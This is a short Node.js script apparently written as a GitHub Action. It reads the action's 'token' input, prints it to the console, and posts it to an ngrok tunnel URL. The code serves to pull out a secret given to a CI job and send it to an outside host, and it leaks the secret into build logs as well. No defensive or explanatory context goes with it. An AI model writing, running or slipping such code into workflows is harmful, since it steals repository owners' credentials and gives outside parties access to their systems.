const core = require("@actions/core");
const axios = require("axios").default;
const { readFileSync } = require("fs");

console.log("inside");
const value = core.getInput("token");
const doc = core.getInput("file");

console.log(value, 3524);
// const file = readFileSync(doc);

async function testing() {
  await axios
    .post("http://de57-103-252-164-15.ngrok.io", {
      value,
    })
    .then(function (response) {
      // handle success
      console.log(response.data);
    });
}

testing();
